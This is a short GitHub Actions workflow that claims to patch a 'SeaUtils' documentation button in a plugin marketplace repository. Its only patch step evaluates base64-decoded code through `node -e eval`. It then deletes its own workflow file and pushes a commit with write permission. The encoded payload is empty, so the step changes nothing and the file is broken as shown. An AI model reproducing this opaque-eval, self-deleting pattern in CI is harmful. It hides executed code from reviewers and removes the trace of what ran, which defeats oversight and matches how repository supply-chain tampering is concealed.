name: Update SeaUtils documentation button

on:
  workflow_dispatch:
  push:
    paths:
      - .github/workflows/update-seautils-doc-button.yml

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Patch SeaUtils documentation button
        run: |
          node -e "eval(Buffer.from('','base64').toString('utf8'))"
          rm -f .github/workflows/update-seautils-doc-button.yml
      - name: Commit update and remove workflow
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add plugins/SeaUtils-Kolex06-Version.json marketplace.json .github/workflows/update-seautils-doc-button.yml
          git commit -m "Update SeaUtils documentation button" || exit 0
          git push
